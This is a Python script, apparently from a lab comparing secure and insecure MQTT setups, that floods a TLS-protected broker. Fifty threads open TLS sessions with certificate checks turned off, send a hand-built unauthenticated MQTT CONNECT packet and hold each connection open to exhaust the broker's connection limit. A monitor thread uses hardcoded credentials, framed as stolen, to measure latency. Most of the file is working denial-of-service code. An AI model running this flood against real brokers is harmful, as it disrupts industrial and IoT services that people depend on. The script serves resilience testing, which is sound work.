#!/usr/bin/env python3
"""
03_dos.py - DoS Attack (SECURE environment)

Same structure as insecure for fair comparison:
50 clients attempt TLS connections without valid credentials.
Each attempt forces broker to complete full TLS handshake before rejecting.
TLS crypto overhead + max_connections limit partially mitigate the attack.

Latency monitor uses valid credentials to measure broker responsiveness.

Expected: partial degradation from TLS overhead, broker stays functional.
MITRE ATT&CK ICS: T0814 Denial of Service
"""

import paho.mqtt.client as mqtt
import threading
import socket
import ssl
import time
import json
import os
from datetime import datetime, timezone

BROKER_HOST       = os.getenv("BROKER_HOST", "172.21.0.20")
BROKER_PORT       = int(os.getenv("BROKER_PORT", 8883))
FLOOD_CONNECTIONS = 50
MSGS_PER_CLIENT   = 10000
HOLD_DURATION     = 15
FLOOD_TOPIC       = "attack/dos/flood"
LATENCY_TOPIC     = "metrics/dos/latency"
OUTPUT_DIR        = "/attacker/results"
CA_CERT           = "/attacker/ca.crt"

# Credenziali valide per il monitor (simulate come rubate)
MONITOR_USER = "metrics_collector"
MONITOR_PASS = "Metrics2026"

latency_samples  = []
connections_ok   = [0]
connections_fail = [0]
lock             = threading.Lock()
monitor_running  = threading.Event()
monitor_running.set()
current_phase    = ["baseline"]


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)


def latency_monitor():
    """
    Measures broker latency using valid credentials throughout the attack.
    This simulates a legitimate sensor trying to communicate during the attack.
    """
    received  = threading.Event()
    send_time = [0.0]

    def on_connect(c, u, f, rc, p):
        if rc == 0:
            c.subscribe(LATENCY_TOPIC, qos=0)

    def on_message(c, u, msg):
        lat = round((time.time() - send_time[0]) * 1000, 2)
        latency_samples.append({"ts": datetime.now().isoformat(),
                                 "ms": lat, "phase": current_phase[0]})
        received.set()

    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dos_monitor")
    client.tls_set(ca_certs=CA_CERT, tls_version=ssl.PROTOCOL_TLS_CLIENT)
    client.tls_insecure_set(False)
    client.username_pw_set(MONITOR_USER, MONITOR_PASS)
    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=60)
        client.loop_start()
        time.sleep(0.5)
        while monitor_running.is_set():
            received.clear()
            send_time[0] = time.time()
            client.publish(LATENCY_TOPIC, "probe", qos=0)
            if not received.wait(timeout=3.0):
                latency_samples.append({"ts": datetime.now().isoformat(),
                                         "ms": 3000, "phase": current_phase[0]})
            time.sleep(0.5)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        log(f"[!] Monitor error: {e}")


def tls_flood_worker(worker_id):
    """
    Open TLS connection without valid credentials.
    Broker completes TLS handshake (expensive) then rejects.
    Connection held open to saturate max_connections limit.
    """
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.create_connection((BROKER_HOST, BROKER_PORT), timeout=10)
        s = ctx.wrap_socket(s)
        # Send MQTT CONNECT without credentials
        client_id = f"flood_{worker_id}".encode()
        payload   = (b"\x00\x04MQTT\x04\x02\x00\x3c" +
                     bytes([0, len(client_id)]) + client_id)
        s.send(bytes([0x10, len(payload)]) + payload)
        time.sleep(HOLD_DURATION)
        s.close()
        with lock:
            connections_ok[0] += 1
    except Exception:
        with lock:
            connections_fail[0] += 1


def stats(phase):
    s = [x["ms"] for x in latency_samples if x["phase"] == phase]
    if not s:
        return {"count": 0, "avg": "N/A", "min": "N/A", "max": "N/A"}
    return {"count": len(s), "avg": round(sum(s)/len(s), 2),
            "min": round(min(s), 2), "max": round(max(s), 2)}


def main():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_file = f"{OUTPUT_DIR}/03_dos_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    print("==============================================")
    print(" SCENARIO 3 - DoS Attack (SECURE)")
    print("==============================================")
    print(f" Broker         : {BROKER_HOST}:{BROKER_PORT}")
    print(f" Flood clients  : {FLOOD_CONNECTIONS}")
    print(f" Hold duration  : {HOLD_DURATION}s per connection")
    print(f" Auth required  : YES — connections rejected after TLS handshake")
    print(f" TLS            : YES — expensive crypto per connection")
    print(f" Expected       : Partial degradation, broker stays functional")
    print("==============================================\n")

    t_mon = threading.Thread(target=latency_monitor, daemon=True)
    t_mon.start()

    # Baseline
    log("[*] Collecting baseline latency (10s)...")
    time.sleep(10)
    bs = stats("baseline")
    log(f"[+] Baseline: avg={bs['avg']}ms  max={bs['max']}ms  samples={bs['count']}\n")

    # Flood
    log(f"[*] Launching TLS flood: {FLOOD_CONNECTIONS} connections x {HOLD_DURATION}s hold...")
    log(f"[*] Each connection: full TLS handshake → MQTT CONNECT → auth rejected → hold open")
    current_phase[0] = "flood"
    threads = [threading.Thread(target=tls_flood_worker, args=(i,))
               for i in range(FLOOD_CONNECTIONS)]
    for t in threads:
        t.start()

    while any(t.is_alive() for t in threads):
        alive = sum(1 for t in threads if t.is_alive())
        s = stats("flood")
        log(f"[~] Active: {alive}/{FLOOD_CONNECTIONS} | "
            f"Latency avg={s.get('avg','N/A')}ms max={s.get('max','N/A')}ms | "
            f"Connections ok={connections_ok[0]} fail={connections_fail[0]}")
        time.sleep(2)

    for t in threads:
        t.join()

    fs = stats("flood")
    log(f"[+] Flood complete: avg={fs['avg']}ms  max={fs['max']}ms  samples={fs['count']}\n")

    # Recovery
    current_phase[0] = "recovery"
    time.sleep(5)
    monitor_running.clear()
    time.sleep(1)
    rs = stats("recovery")
    log(f"[+] Recovery: avg={rs['avg']}ms  max={rs['max']}ms\n")

    d = round((fs["avg"] - bs["avg"]) / bs["avg"] * 100, 1) \
        if isinstance(fs["avg"], float) and isinstance(bs["avg"], float) and bs["avg"] > 0 \
        else "N/A"

    results = {
        "environment":      "secure",
        "broker":           f"{BROKER_HOST}:{BROKER_PORT}",
        "flood_clients":    FLOOD_CONNECTIONS,
        "hold_duration_s":  HOLD_DURATION,
        "latency_baseline": bs,
        "latency_flood":    fs,
        "latency_recovery": rs,
        "degradation_pct":  d,
        "connections_ok":   connections_ok[0],
        "connections_fail": connections_fail[0],
        "messages_delivered": 0,
        "auth_required":    True,
        "tls":              True,
        "all_samples":      latency_samples,
    }
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

    print("==============================================")
    print(" ATTACK SUMMARY - Scenario 3 (SECURE)")
    print("==============================================")
    print(f" Baseline latency  : avg={bs['avg']}ms  max={bs['max']}ms")
    print(f" Flood latency     : avg={fs['avg']}ms  max={fs['max']}ms")
    print(f" Recovery latency  : avg={rs['avg']}ms")
    print(f" Degradation       : {'+' if isinstance(d, float) and d > 0 else ''}{d}%")
    print(f" Connections ok    : {connections_ok[0]}/{FLOOD_CONNECTIONS}")
    print(f" Messages delivered: 0 — auth blocked all connections")
    print(f" Result            : PARTIALLY MITIGATED")
    print(f" Output            : {output_file}")
    print("==============================================")


if __name__ == "__main__":
    main()
